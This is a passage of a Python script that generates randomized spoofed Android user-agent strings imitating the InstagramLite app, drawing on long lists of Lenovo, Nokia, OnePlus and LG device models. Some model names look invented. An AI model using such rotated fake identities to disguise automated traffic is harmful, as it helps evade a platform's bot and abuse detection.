'Lenovo A399', 'Lenovo A399', 'Lenovo A4526', 'L18011', 'Lenovo L18011', 'Lenovo A5000', 'Lenovo A5000', 'Lenovo A5000', 'Lenovo A516', 'Lenovo A516', 'Lenovo A516', 'Lenovo-A516/S111', 'Lenovo A516', 'Lenovo A520/S101', 'Lenovo A526', 'LENOVO A526', 'Lenovo A526', 'LENOVO A526', 'Lenovo A526', 'Lenovo A526', 'Lenovo A526', 'Lenovo A526', 'Lenovo A529', 'Lenovo A529', 'Lenovo A536', 'Lenovo A536', 'Lenovo A536', 'Lenovo A560', 'Lenovo A560', 'Lenovo A560/JLS36C', 'Lenovo A5600', 'Lenovo A5600', 'LNV-Lenovo_A560e', 'Lenovo A5860', 'LenovoA588t', 'Lenovo A590', 'Lenovo L18081', 'Lenovo L19041', 'Lenovo A6000', 'Lenovo A6000', 'Lenovo A6000 Plus', 'Lenovo A6010', 'Lenovo A6010', 'Lenovo A6010Pro', 'Lenovo A606', 'Lenovo A606', 'Lenovo A616', 'Lenovo A630', 'Lenovo A630/S001', 'Lenovo A630t', 'Lenovo A630t', 'Lenovo A656', 'Lenovo A66/S001', 'Lenovo A660', 'Lenovo A660', 'Lenovo A660', 'Lenovo A6600', 'Lenovo A6600d40', 'Lenovo A6600a40', 'Lenovo A670t', 'Lenovo A680', 'Lenovo A680', 'Lenovo A680_ROW', 'Lenovo A6800', 'Lenovo A688t', 'Lenovo A690', 'Lenovo A690/S001', 'Lenovo L19111', 'Lenovo A7000 Plus', 'Lenovo A7000a', 'Lenovo A706', 'LENOVO A706', 'Lenovo_A706/JZO54K', 'Lenovo A708t', 'Lenovo A750', 'Lenovo A750', 'Lenovo A760', 'Lenovo A760', 'Lenovo_A766/JOP40D', 'Lenovo A768t', 'Lenovo A7700', 'Lenovo A788t', 'Lenovo A788t', 'Lenovo A789', 'lenovo A789', 'LENOVO A789', 'Lenovo L10041', 'Lenovo A800', 'Lenovo A800', 'Lenovo A805e', 'Lenovo A808', 'Lenovo A808t', 'Lenovo A808t', 'Lenovo A808t', 'Lenovo A816', 'Lenovo A816', 'Lenovo A820', 'Lenovo A820', 'Lenovo A820', 'Lenovo_A820', 'lenovoA820c', 'Lenovo A820e', 'Lenovo A820t', 'Lenovo A828t', 'Lenovo A828t', 'Lenovo A830', 'Lenovo A850', 'Lenovo A850', 'Lenovo A850', 'Lenovo A850', 'Lenovo A850', 'Lenovo A850', 'Lenovo A850', 'Lenovo A850', 'lenovoA850c', 'Lenovo A850i', 'Lenovo A858t', 'LENOVO A859', 'Lenovo A859', 'Lenovo A859', 'Lenovo A859', 'Lenovo A859', 'Lenovo A880', 'Lenovo A880', 'Lenovo A880', 'Lenovo A880', 'Lenovo A889', 'Lenovo A889', 'Lenovo A889', 'Lenovo A916', 'Lenovo A916', 'Lenovo_A916', 'Lenovo A916', 'Lenovo A938t', 'Lenovo A2016b30', 'Lenovo K10a40', 'Lenovo D101', 'Lenovo-D101', 'd-42A', 'Lenovo TB-X104F', 'Lenovo TB-X104L', 'Lenovo G756', 'Lenovo A806', 'Lenovo A936', 'Lenovo A936', 'Lenovo_A936', 'Lenovo H75676', 'Lenovo I5', 'Lenovo-I960', 'IdeaPadA10', 'IdeaPadA10', 'IdeaPadA10', 'IdeaPadA10', 'IdeaPadA10', 'Ideapad K1', 'Ideapad K1', 'IdeaTabA1000-F', 'IdeaTabA1000-G', 'IdeaTabA1000-T', 'IdeaTabA1000-F', 'IdeaTabA1000-T', 'IdeaTabA1000-T', 'IdeaTabA1000-F', 'IdeaTabA1000-F', 'IdeaTabA1000-G', 'IdeaTabA1000-F', 'IdeaTab A2107A-F', 'IdeaTab A2107A-F', 'IdeaTabA2109A', 'IdeaTabA2109A', 'A2109A', 'IdeaTabA2109A', 'IdeaTabA2207A-H', 'IdeaTab A3000-H', 'IdeaTab A3000-H', 'Lenovo A3000-H', 'Lenovo A3000-H', 'IdeaTabA5000-E', 'IdeaTab_A5000-E', 'Lenovo B8080-H', 'IdeaTabS2109A-F', 'IdeaTabS2109A-F', 'IdeaTabS2109A-F', 'IdeaTabS2110AH', 'Lenovo S5000-F', 'Lenovo S5000-H', 'Lenovo S5000-H/JDQ39', 'Lenovo S6000-H', 'IdeaTab S6000-H', 'IdeaTab S6000-F', 'ar_AE Lenovo K10', 'Lenovo K10 Note', 'Lenovo L39051', 'Lenovo K10e70', 'Lenovo K10e70', 'Lenovo L38083', 'Lenovo L38082', 'Lenovo K11', 'Lenovo K11 Power', 'Lenovo K12', 'Lenovo XT2081-4', 'Lenovo K12 Note', 'Lenovo K12 Pro', 'Lenovo K13', 'Lenovo K13 Note', 'Lenovo K13 Pro', 'Lenovo K14', 'Lenovo K14 Note', 'Lenovo K14 Plus', 'Lenovo K15 Plus', 'Lenovo K30-W', 'Lenovo K50a40', 'Lenovo K50-t5', 'Lenovo K50-T5', 'K31-t3', 'Lenovo K31-t3', 'Lenovo K320t', 'arm Lenovo K320t', 'Lenovo K32c30', 'Lenovo K32c36', 'Lenovo K32c36', 'Lenovo K33', 'Lenovo K33b37', 'MZ-Lenovo K3note', 'Lenovo K4', 'Lenovo A7010a48', 'K350t', 'Lenovo A7020a48', 'Lenovo A7020a40', 'Lenovo K52e78', 'Lenovo L38012', 'Lenovo L38011', 'en Lenovo L38011', 'Lenovo L38011', 'Lenovo L38041', 'Lenovo K5 Pro', 'Lenovo_K50_T5', 'Lenovo K52t38', 'Lenovo K52t58', 'Lenovo K53', 'Lenovo K53b36', 'Lenovo L38031', 'Lenovo K33b36', 'Lenovo K33a48', 'Lenovo K53a48', 'Lenovo K33a42', 'Lenovo_K33a42', 'lenovoK7', 'Lenovo K8', 'Lenovo K8 Note', 'Lenovo K8 Plus', 'Lenovo K8 Plus', 'Lenovo K80M', 'Lenovo K80M', 'Lenovo_K80M', 'Lenovo K860', 'Lenovo L38043', 'Lenovo L38043', 'Lenovo K900', 'Lenovo K900', 'Lenovo_K900_ROW', 'Lenovo K910', 'Lenovo K910', 'Lenovo K910e', 'Lenovo L79041', 'Lenovo L70081', 'Lenovo L79031', 'Lenovo L79031', 'Lenovo L71091', 'Lenovo L71091', 'Lenovo L71091', 'Lenovo TB-9707F', 'Lenovo L71061', 'VR-1541F', 'TB-X704A', 'Lenovo TB-X704A', 'Lenovo N300', 'Lenovo N300', 'Lenovo N308', 'Lenovo Note 5', 'lenovo P01k000', 'Lenovo_P1m', 'Lenovo P1m', 'Lenovo P2a42', 'Lenovo P2a42', 'Lenovo P2c72', 'Lenovo P2c72', 'Lenovo P70', 'Lenovo P70', 'Lenovo p70', 'Lenovo P700', 'Lenovo P700i', 'Lenovo P770', 'Lenovo P770', 'Lenovo P770', 'Lenovo P770', 'Lenovo P780', 'Lenovo P780', 'Lenovo P780', 'Lenovo P90', 'Lenovo P90', 'Lenovo-P960', 'Lenovo PB1-750M', 'Lenovo PB2-650M', 'Lenovo PB2-670M', 'Lenovo PB1-770M', 'Lenovo S1c58', 'Lenovo S1L a40', 'Lenovo K520', 'Lenovo K520', 'Lenovo L58041', 'Lenovo L58091', 'Lenovo S580', 'Lenovo S580', 'Lenovo S60-a', 'Lenovo S60-a', 'Lenovo S60A', 'Lenovo S650', 'Lenovo S650', 'Lenovo S650', 'Lenovo S658t', 'Lenovo S660', 'LenovoS668T', 'Lenovo S668T', 'Lenovo S668t', 'Lenovo S720', 'Lenovo S720', 'Lenovo S720', 'Lenovo S720', 'Lenovo S720i', 'Lenovo S720i', 'Lenovo S750', 'lenovo s750', 'Lenovo S750', 'Lenovo S810t', 'Lenovo S820', 'Lenovo S820', 'Lenovo S820', 'lenovo S820c', 'Lenovo S820e', 'Lenovo S850', 'Lenovo S850t', 'Lenovo S856', 'Lenovo S858t', 'Lenovo S860', 'Lenovo S860', 'Lenovo S860', 'Lenovo S860', 'Lenovo S860/JDQ39', 'LNV-Lenovo S870e', 'Lenovo S880', 'Lenovo S880', 'Lenovo S890', 'Lenovo S890', 'Lenovo S890', 'Lenovo S890', 'Lenovo-S890/S100', 'Lenovo S898t', 'Lenovo S898t /V1.5', 'Lenovo s898t', 'Lenovo S90A', 'LenovoS90C', 'Lenovo S920', 'Lenovo S920', 'Lenovo S920/V1.5', 'Lenovo S930', 'Lenovo S938t', 'Lenovo S939', 'Lenovo S939', 'Lenovo S960', 'Lenovo S960', 'Lenovo TB-8505FS', 'Lenovo TB-8505XS', 'Lenovo TAB 2 A10-70L', 'Lenovo TAB 2 A7-30HC', 'Lenovo TAB 2 A7-30DC', 'Lenovo TAB 2 A7-30GC', 'Lenovo TB-8504F', 'Lenovo TB-8704F', 'A101LV', 'Lenovo TB-7504X',\
                                                        'Lenovo TB-7504X', 'Lenovo TB-7304X', 'Lenovo TB-7304I', 'Lenovo TB-7304F', 'Lenovo TB-7104F', 'Lenovo TB-7104I', 'Lenovo TB-8304F1', 'Lenovo TB-8304F1', 'Lenovo TB-X6C6F', 'Lenovo TB-X6C6X', 'Lenovo TB-J606N', 'Lenovo TB-J607Z', 'Lenovo TB-X505F', 'Lenovo TB-X505X', 'Lenovo TB-X505L', 'Lenovo TB-X605F', 'TB328FU', 'TB328XU', 'Lenovo TB-X605L', 'Lenovo TB-X605M', 'Lenovo TB-X606XA', 'Lenovo TB-X606F', 'Lenovo TB-X605LC', 'Lenovo TB-X605FC', 'Lenovo TB-X306FA', 'Lenovo TB-X306X', 'Lenovo TB125FU', 'Lenovo TB128XU', 'TB128FU', 'Lenovo TB-7305X', 'Lenovo TB-7305X', 'Lenovo TB-7305F', 'Lenovo TB-7305I', 'Lenovo TB-7306F', 'Lenovo TB-7306X', 'Lenovo TB-8506F', 'Lenovo TB-8506FS', 'Lenovo TB-8506X', 'Lenovo TB-8705F', 'Lenovo TB-X705L', 'Lenovo TB-X705F', 'Lenovo TB-J606F', 'Lenovo TB-J606L', 'TB350FU', 'Lenovo TB-J616F', 'Lenovo TB-J616X', 'Lenovo TB-J706F', 'Lenovo TB-J706L', 'TB132FU', 'Lenovo TB-Q706F', 'Lenovo TB-Q706Z', 'Lenovo TB-J607F', 'Lenovo PB-6505M', 'Lenovo PB-6505Y', 'Lenovo TB3-X70F', 'Lenovo TB3-X70L', 'Lenovo TB3-730X', 'Lenovo TB3-710I', 'Lenovo TB3-710F', 'Lenovo TB-7703X', '601LV', 'Lenovo TB3-850M', 'Lenovo TB3-850F', '602LV', 'Lenovo TB-8703X', 'Lenovo TB-8703F', 'Lenovo TB-X304L', 'Lenovo TB-X304F', 'Lenovo TB-X704L', 'Lenovo TB-X704F', '701LV', 'Lenovo TB-8504X', 'Lenovo TB-8704X', 'Lenovo TB-8X04F', 'Lenovo TB350XU', 'Lenovo ThinkPad 13', 'ThinkPadTablet', 'ThinkPad Tablet', 'ThinkPad Tablet', 'ThinkPad Tablet', 'ThinkPad Tablet', 'Lenovo A1000m', 'Lenovo vibe a plus', 'Lenovo A2016a40', 'Lenovo A2016a40', 'Lenovo A2020a40', 'VIBE C', 'Lenovo A6020a41', 'Lenovo A6020l36', 'Lenovo A6020a40', 'Lenovo A6020l37', 'Lenovo A6020a46', 'Vibe K5 Plus', 'Lenovo P1a42', 'Lenovo P1c58', 'Lenovo P1a41', 'Vibe P1 Turbo', 'Lenovo P1ma40', 'Lenovo S1c50', 'Lenovo S1a40', 'Lenovo S1La40', 'VIBE_S2i', 'VIBE S3i', 'VIBE S5i', 'VIBE S6i', 'VIBE S6i Plus', 'VIBE S7i', 'Lenovo Z90a40', 'Lenovo Z90-7', 'VIBE V7', 'Lenovo X2-AP', 'Lenovo X2-TO', 'Lenovo X2-TO', 'Lenovo X3c70', 'Lenovo X3c50', 'Lenovo X3a40', 'Lenovo K51c78', 'Lenovo K51c78', 'Lenovo X3 Lite', 'Lenovo K910L', 'Lenovo K910L', 'Lenovo Vibe Z2', 'Lenovo K920', 'Lenovo X2-EU', 'Lenovo X2-EU', 'lenovo x606fa', 'TB138FC', 'Lenovo YT3-X90X', 'Lenovo YT3-X90L', 'Lenovo YT3-X90F', 'Lenovo YB-Q501F', 'Lenovo YB1-X90F', 'Lenovo YB1-X90L', 'Lenovo YT-K606F', 'Lenovo YT-X705L', 'Lenovo YT-X705X', 'Lenovo YT-X705F', 'Lenovo YT-J706F', 'Lenovo YT-J706X', 'Lenovo YT3-X50F', 'Lenovo YT3-X50L', 'Lenovo YT3-X50M', 'Lenovo YT3-850M', 'Lenovo YT3-850M', 'Lenovo YT3-850F', 'Lenovo YT3-850L', 'Lenovo YT-X703F', 'Lenovo YT-X703L', 'Lenovo B8000-H', 'Lenovo B8000-F', 'Yoga Tablet 2', 'Lenovo B6000-F/JDQ39', 'Lenovo B6000-HV', 'Lenovo Z2', 'Lenovo Z2', 'Z2 Plus', 'Lenovo Z2w', 'Lenovo L78011', 'Lenovo L78031', 'Lenovo Z5 Pro', 'Lenovo L78032', 'Lenovo L78071', 'Lenovo L78071', 'Lenovo Z5s', 'Lenovo L78121', 'Lenovo L78121', 'Lenovo L78121', 'Lenovo Z6 Lite', 'Lenovo L78051', 'Lenovo L38111', 'ZUK Z2151', 'ZUK Z2151', 'ZUK Z1', 'ZUK Z2132', 'ZUK Z2132', 'ZUK Z2131', 'ZUK Z2121'])
                    self.useragent = ('Mozilla/5.0 (Linux; Android {}; {}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{} Mobile Safari/537.36 InstagramLite 3.0.0.7.78 Android (21/{}; {}; LENOVO; {}; marlin; qcom; in_ID; 117883409)'.format(self.android_version, self.device_model, self.browser_version, self.Android_Version(self.android_version), self.android_version, self.dpi_pixel, self.device_model))
                elif self.jenis == 'Nokia':
                    self.android_version = random.choice(['12', '13', '10', '9', '11'])
                    self.device_model = random.choice(['Nokia 1', 'Nokia 1 Plus', 'Nokia 1011', 'Nokia 105', 'Nokia 2.1', 'Nokia 2 V', 'Nokia 2 V Tella', 'TA-1032', 'TA-1020', 'TA-1032', 'Nokia 3 V', 'Nokia_3310_4G', 'Nokia 3310', 'NOKIA 3310', 'Nokia 4', 'TA-1053', 'TA-1024', 'TA-1021', 'TA-1021', 'TA-1033', 'TA-1000', 'Nokia 1.3', 'TA-1041', 'Nokia 7', 'TA-1041', 'TA-1041', 'Nokia 7 plus', 'Nokia 7 plus', 'TA-1004', 'TA-1012', 'TA-1012', 'TA-1052', 'Nokia 8 Sirocco', 'Nokia 8910i', 'Nokia 8 V 5G UW', 'Nokia 9', 'Nokia C01 Plus', 'Nokia C01 Plus', 'Nokia C02', 'Nokia C1', 'es Nokia C1 Plus', 'Nokia C1', 'Nokia C1 Plus', 'Nokia C1 2nd Edition', 'Nokia C1', 'Nokia C1', 'Nokia C10', 'N152DL', 'Nokia C100', 'Nokia C12', 'Nokia C12 Pro', 'Nokia C2', 'Nokia C2', 'Nokia C2', 'Nokia C2 2nd Edition', 'Nokia C2 Tennen', 'Nokia C20', 'Nokia C20 Plus', 'Nokia C200', 'N151DL', 'Nokia C21', 'Nokia C21 Plus', 'Nokia C22', 'Nokia C3', 'Nokia C30', 'Nokia C31', 'Nokia C32', 'Nokia C5 Endi', 'Nokia G10', 'N150DL', 'Nokia G100', 'Nokia G11', 'Nokia G11 Plus', 'Nokia G20', 'Nokia G20', 'Nokia G21', 'Nokia G22', 'N1374DL', 'Nokia G400 5G', 'Nokia G50', 'Nokia G60 5G', 'Lumia 430', 'Nokia N900', 'Nokia Streaming Box 8000', 'Nokia T10', 'Nokia T20', 'Nokia T21', 'Nokia_X', 'Nokia_X', 'Nokia_X', 'Nokia X10', 'Nokia X100', 'Nokia_X2', 'NokiaX2DS', 'NokiaX2DS', 'NokiaX2DS', 'NokiaX2DS', 'Nokia X20', 'Nokia X30 5G', 'Nokia X5', 'Nokia X5', 'Nokia X6', 'Nokia X6', 'Nokia X7', 'Nokia X7', 'Nokia X71', 'Nokia_XL', 'Nokia_XL', 'Nokia_XL', 'Nokia XR20', 'Nokia XR21'])
                    self.useragent = ('Mozilla/5.0 (Linux; Android {}; {}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{} Mobile Safari/537.36 InstagramLite 3.0.0.7.78 Android ({}/{}; {}; HMD Global/Nokia; {}; marlin; qcom; in_ID; 117883409)'.format(self.android_version, self.device_model, self.browser_version, self.Android_Version(self.android_version), self.android_version, self.dpi_pixel, self.device_model))
                elif self.jenis == 'Oneplus':
                    self.android_version = random.choice(['10', '12', '13', '9'])
                    self.device_model = random.choice(['NE2213', 'NE2217', 'NE2215', 'NE2210', 'NE2210', 'CPH2423', 'CPH2411', 'CPH2417', 'CPH2413', 'CPH2415', 'CPH2449', 'CPH2487', 'ONE A2003', 'ONE A2003', 'ONE A2001', 'ONE A2005', 'ONEPLUS A3003', 'ONEPLUS A3000', 'ONEPLUS A3010', 'ONEPLUS A5000', 'ONEPLUS A5000', 'ONEPLUS A5010', 'ONEPLUS A5010', 'ONEPLUS A5010', 'ONEPLUS A5010', 'ONEPLUS A5010', 'ONEPLUS A6003', 'ONEPLUS A6000', 'ONEPLUS A6010', 'ONEPLUS A6013', 'ONEPLUS A6010', 'GM1900', 'GM1901', 'GM1903', 'GM1917', 'GM1913', 'GM1911', 'GM1910', 'GM1915', 'GM1910', 'HD1901', 'HD1903', 'HD1900 Flow', 'HD1905', 'HD1900', 'HD1907', 'HD1911', 'HD1913', 'HD1910', 'GM1925', 'HD1925', 'GM1920', 'IN2013', 'IN2015', 'IN2010', 'IN2010', 'IN2017', 'IN2019', 'IN2023', 'IN2025', 'IN2020', 'OnePlus8Pro', 'KB2005', 'KB2001', 'KB2007', 'KB2003', 'KB2000', 'OnePlus 8T 5G', 'LE2115', 'LE2113', 'LE2111', 'LE2110', 'LE2120', 'LE2125', 'LE2123', 'LE2121', 'LE2127', 'OnePlus9Pro', 'LE2101', 'LE2100', 'MT2111', 'MT2110', 'ONEPLUS A19677', 'ONEPLUS A2345', 'Oneplus A31', 'Oneplus A3331', 'ONEPLUS A35904', 'ONEPLUS A37000', 'ONEPLUS A3EVB', 'ONEPLUS A62322', 'ONEPLUS A64794', 'ONEPLUS A65369', 'ONEPLUS A68333', 'ONEPLUS A70458', 'ONEPLUS A70791', 'ONEPLUS A78637', 'ONEPLUS A80828', 'ONEPLUS A83306', 'ONEPLUS A87046', 'ONEPLUS A90641', 'Oneplus A99831', 'PGKM10', 'PGKM10', 'PHK110', 'PHK110', 'PGP110', 'PGP110', 'PGZ110', 'ONEPLUS KB2023', 'OnePlus Nord', 'Oneplus Nord 2', 'DN2103', 'DN2101', 'CPH2399', 'CPH2401', 'AC2001', 'AC2003', 'IV2201', 'CPH2409', 'CPH2381', 'CPH2465', 'EB2103', 'EB2101', 'EB2101', 'BE2025', 'BE2026', 'BE2029', 'Nord N10 5G', 'BE2028', 'BE2013', 'BE2011', 'BE2012', 'CPH2459', 'GN2200', 'CPH2469', 'DE2118', 'DE2117', 'A0001', 'ONE E1001', 'ONE E1003', 'ONE E1001', 'ONE E1005'])
                    self.useragent = ('Mozilla/5.0 (Linux; Android {}; {}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{} Mobile Safari/537.36 InstagramLite 3.0.0.7.78 Android ({}/{}; {}; OnePlus; {}; marlin; qcom; in_ID; 117883409)'.format(self.android_version, self.device_model, self.browser_version, self.Android_Version(self.android_version), self.android_version, self.dpi_pixel, self.device_model))
                elif self.jenis == 'Lg':
                    self.android_version = random.choice(['9', '10'])
                    self.device_model = random.choice(['LG-FL40L', 'LG-FL40L', 'SAMSUNG LGM-30', 'LG 354g', 'LG5', 'LG5', 'LG-LG730', 'LG-LG730', 'LG-LG730', 'LG-78L', 'LG82B0', 'LG-LG855', 'LG-LG855', 'LG-LG855', 'LG-LG870', 'LG-LG870', 'LG-LG870', 'LGAEOHRJR1', 'LG-AK495', 'LG-F520K', 'LG-F520L', 'LG-F520S', 'LG-F520L', 'LG-F520S', 'LG-F520L', 'LG-F520S', 'LG-F520S', 'LG-F520L', 'LG-F520S', 'LG-F520L', 'LG-F520S', 'LG-F520S', 'LG Android TV', 'LGANVLWSV1', 'LGMS210', 'LG-M210', 'LM-X210', 'LM-X210(G)', 'LM-X220', 'LG-AS330', 'LG-AS330', 'LGAS375', 'LG-AS680', 'LG-AS680', 'LG-AS695', 'LG-AS695', 'LG-AS695', 'LG-AS730', 'LG-AS730', 'LG-AS730', 'LG-AS780', 'LG-AS811', 'LG-AS840', 'LG-AS840', 'LG-AS840', 'LG-AS855', 'LG-AS855', 'LG-AS991', 'LG-AS991', 'LG-F570S', 'LG-F570S', 'LG-X165g', 'LG-X150', 'LG-X155', 'LGBJTMDWZ6', 'LG-C550', 'LG-C550', 'LG-C550', 'LG-C550', 'LG-C550', 'LG-C550', 'LG-C550', 'LG-C550', 'LG-C550', 'LG-C550', 'LG-C555', 'LG-C555', 'LG-C555', 'LG-C555', 'LG-C660', 'LG-C660', 'LG-C660', 'LG-C660', 'LG-C660', 'LG-C660', 'LG-C660', 'LG-C660h', 'LG-C660h', 'LG-C660h', 'LG-C710h', 'LG-C710h', 'LG-C710h', 'LG-C710h', 'LG-C729', 'LG-C729', 'LG-C729', 'LG-C729', 'LG-C729', 'LG-C729', 'LG-C800', 'LG-C800', 'LG-C800', 'LG-C800', 'LG-C800', 'LG-C800', 'LG-C800G', 'LG-C800G', 'LG-C800G', 'LG-C800G', 'LG-F620S', 'LGL18VC', 'LG-CX670', 'LG-CX670', 'LG-CX670', 'LG-CX670', 'LG-D226', 'LG-D307', 'LG-D390', 'LG-D390AR', 'LG-D392', 'LG-D392', 'LG-D392', 'LG-D397', 'LG-D500', 'LG-D500', 'LG-D500', 'LG-D500', 'LG-D500', 'LG-D520', 'LG-D520', 'LG-D700', 'LG-D700', 'LG-D700', 'LG-D727', 'LG-D727', 'LG-D727', 'LG-D729', 'LG-D729', 'LG-D820', 'LG-D820BKR', 'LG-D857', 'LG-D857', 'LG-D857', 'LG-D857', 'LG-D857', 'LG-D859', 'LG-D859', 'LG-E400b', 'LG-E400b', 'LG-E400b', 'LG-E400g', 'LG-E400g', 'LG-E400g', 'LG-E400g', 'LG-E400g', 'LG-E400g', 'LG-E400g', 'LG-E400g', 'LG-E400g', 'LG-E400g', 'LG-E400g', 'LG-E400g', 'LG-E400g', 'LG-E405', 'LG-E405', 'LG-E405', 'LG-E405', 'LG-E405', 'LG-E405f', 'LG-E405F', 'LG-E405f', 'LG-E405f', 'LG-E405f', 'LG-E405f', 'LG-E405f', 'LG-E405f', 'LG-E405f', 'LG-E405f', 'LG-E405f', 'LG-E405f', 'LG-E411g', 'LG-E411g', 'LG-E411g', 'LG-E411g', 'LG-E411g', 'LG-E415g', 'LG-E415g', 'LG-E415g', 'LG-E415g', 'LG-E415g', 'LG-E415g', 'LG-E425', 'LG-E425', 'LG-E425', 'LG-E425', 'LG-E425', 'LG-E425', 'LG-E425', 'LG-E425', 'LG-E425', 'LG-E425', 'LG-E425', 'LG-E425c', 'LG-E425f', 'LG-E425f', 'LG-E425f', 'LG-E425f', 'LG-E425f', 'LG-E425f', 'LG-E425f', 'LG-E425f', 'LG-E425f', 'LG-E425f', 'LG-E425f', 'LG-E425f', 'LG-E425f', 'LG-E425g', 'LG-E425g', 'LG-E425g', 'LG-E425g', 'LG-E425g', 'LG-E425g', 'LG-E425g', 'LG-E425g', 'LG-E425g', 'LG-E425g', 'LG-E425g', 'LG-E425g', 'LG-E425g', 'LG-E425j', 'LG-E425j', 'LG-E425j', 'LG-E431g', 'LG-E431g', 'LG-E431g', 'LG-E431g', 'LG-E451g', 'LG-E451g', 'LG-E451g', 'LG-E451g', 'LG-E455', 'LG-E455', 'LG-E455', 'LG-E455', 'LG-E455f', 'LG-E455f', 'LG-E455f', 'LG-E455f', 'LG-E455g', 'LG-E455g', 'LG-E455g', 'LG-E455g', 'LG-E455g', 'LG-E455g', 'LG-E455g', 'LG-E455g', 'LG-E455g', 'LG-E455g', 'LG-E465g', 'LG-E465g', 'LG-E465g', 'LG-E465g', 'LG-E465g', 'LG-E510', 'LG-E510', 'LG-E510', 'LG-E510', 'LG-E510', 'LG-E510', 'LG-E510', 'LG-E510', 'LG-E510', 'LG-E510', 'LG-E510', 'LG-E510', 'LG-E510', 'LG-E510f', 'LG-E510f', 'LG-E510f', 'LG-E510f', 'LG-E510f', 'LG-E510f', 'LG-E510f', 'LG-E510f', 'LG-E510f', 'LG-E510f', 'LG-E510f', 'LG-E510g', 'LG-E510g', 'LG-E510g', 'LG-E510g', 'LG-E510g', 'LG-E510g', 'LG-E510g', 'LG-E615', 'LG-E615', 'LG-E615', 'LG-E615', 'LG-E615', 'LG-E615', 'LG-E615', 'LG-E615f', 'LG-E615f', 'LG-E615f', 'LG-E617G', 'LG-E617G', 'LG-E617G', 'LG-E617G', 'LG-E617G', 'LG-E720', 'LG-E720', 'LG-E720/V10b', 'LG-E720', 'LG-E720/V10b', 'LG-E720', 'LG-E720/V10b', 'LG-E720/V10b', 'LG-E720', 'LG-E720', 'LG-E720', 'LG-E720', 'LG-E720/V10d', 'LG-E720', 'LG-E720b', 'LG-E720b', 'LG-E720b', 'LG-E720b', 'LG-E720b', 'LG-E720b', 'LG-E720b', 'LG-E720b', 'LG-E720b', 'LG-E720b', 'LG-E730', 'LG-E730', 'LG-E730', 'LG-E730', 'LG-E730', 'LG-E730', 'LG-E730', 'LG-E730', 'LG-E730/V10i', 'LG-E730/V10b', 'LG-E730/V10j', 'LG-E730/V10b', 'LG-E730f', 'LG-E730f', 'LG-E730f', 'LG-E739', 'LG-E739', 'LG-E739', 'LG-E739', 'LG-E739', 'LG-E739', 'LG-E739', 'LG-E739', 'LG-E739', 'LG-E739', 'LG-E960', 'LG-E970', 'LG-E970', 'LG-E970/E97020j', 'LG-E970/E97020j', 'LG-E970/E97011c', 'LG-E970/E97010l', 'LG-E971', 'LG-E971', 'LG-E971', 'LG-E988', 'LG-E988', 'LG-H443', 'LG-H445', 'LG-H445/H44511l', 'LG-H445/H44511i', 'LG-F180', 'LG-F180', 'LG-F180', 'LG-F180', 'LG-F180', 'LG-F180', 'LG-F180', 'LG-F180', 'LG-F200/30d', 'LG-F200', 'LG-F200', 'LG-F200', 'LG-F200/-20', 'LG-F200', 'LG-F270k', 'LG-F320', 'LG-F350', 'LG-F350', 'LG-F350', 'LG-F400', 'LG-F400', 'LG-F400', 'LG-F500', 'LG-F540K', 'LG-F540L', 'LG-F540L', 'LG-F540S', 'LG-F590', 'LG-F590L', 'LGMS395', 'LGMS395', 'LG-D390n', 'LGMS395',\
                                                       'SAMSUNG LG-F600', 'LG-F600/V10o', 'LG-F620EK', 'LG-F640S', 'LG-F690K', 'LG-D315', 'LG-D315/V10d', 'LG-F370S', 'LG-D315/D31510e', 'LGL31L', 'LG-D315', 'LG-F370L', 'LG-F370K/10r', 'LG-F370K/10h', 'LG-F370S', 'LG-F370L', 'LG-F370K/10r', 'LG-F717', 'LG-F720K', 'LGFHZRQWD3', 'LGL63BL', 'LGL163BL', 'LGL164VL', 'LG-M153', 'LM-X210CM', 'LG-D958', 'LG-LS995', 'LGL23', 'LG-D950', 'LGL23', 'LG-D958', 'LG-F340S', 'LG-F340K', 'LG-F340S', 'LGL23', 'LG-H955', 'LG-F510L', 'LG-V411', 'LG-P490L', 'LG-P490L', 'LG-P490L', 'LG-P490L', 'LG-P490L', 'LG-V507L', 'LG-V507L', 'LG-V507L', 'LG-V507L', 'LG-V507L', 'LG-V507L', 'LG-V507L', 'LG-LK460', 'LG-V940n', 'LG-V755', 'LG-V522', 'LG-V525', 'LG-V525S3', 'LG-V930', 'LGUK750', 'LG-D838', 'LG-F350L', 'LG-F350S', 'LG-F350K', 'LG-F350K/10h', 'LG-D686', 'LG-H634', 'LGLS770', 'LG-H631', 'LG-D690', 'VS880PP', 'LG-D631', 'LG-H740', 'LG-H740/H74020r', 'G Watch', 'G Watch R', 'LG-D803', 'LG-D802TR', 'LG-LS980', 'LG-D800', 'VS980 4G', 'LG-F320S', 'LG-D801', 'LG-F320K', 'LG-D805', 'LG-D625', 'LG-D620', 'LG-D610AR', 'LG-D618', 'LG G2x/LG-P999', 'LG-F400L', 'LG-D855', 'VS985 4G', 'LGUS990', 'LG-D856', 'LG-F400S', 'LG-F400K', 'LGV31', 'LG-F410S', 'LG-F410S', 'LG-F410S', 'LG-F410S', 'LG-F410S', 'LG-F410S', 'LG-F410S', 'LG-F470S', 'LG-F470K', 'LG-F470L', 'LG-D725PR', 'LG-D725PR', 'LG-F470S', 'LG-F470S', 'LG-F470S', 'LG-F470L', 'LG-F470S', 'LG-F470L', 'LG-F470S', 'LG-F470L', 'LG-D728', 'LG-F470S', 'LG-F490L', 'LG-F490L', 'LG-F490L', 'LG-F490L', 'LG-F490L', 'LG-D693n', 'LG-D693TR', 'LGLS885', 'LG-G360', 'LG-D722', 'LG-D724', 'LG-H815', 'LG-H818', 'VS986', 'LG-H812', 'LG-F500S', 'LG-H735', 'LG-H540', 'LG-H542', 'LG-H630D', 'LG-H731', 'LG-H525n', 'LG-H736', 'LG-H736', 'LGAS992', 'LG-H831', 'LG-H820', 'LG-H860', 'LG-F700L', 'LG-H850', 'U', 'VS987', 'LGLS992', 'LG-H840', 'LG-H845', 'LGM-G600S', 'LG-H870', 'LG-H870DS', 'VS988', 'LG-H871', 'LG-H871', 'LG-LS993', 'LG-H872', 'LGM-G600K', 'LM-Q850', 'LM-Q910', 'LM-G710', 'LM-G710N', 'LM-G710VM', 'LG-G710', 'LM-G820', 'LM-G820N', 'LG-G806P', 'LM-G810', 'LM-G850', 'LG-F580L', 'LG-GT540', 'LG-GT540', 'LG-GT540', 'LG-GT540', 'LG-GT540', 'LG-GT540', 'LG-GT540', 'LG-GT540', 'LG-GT540', 'LG-GT540', 'LG-GT540', 'LG-GT540', 'LG-GT540', 'LG-GT540', 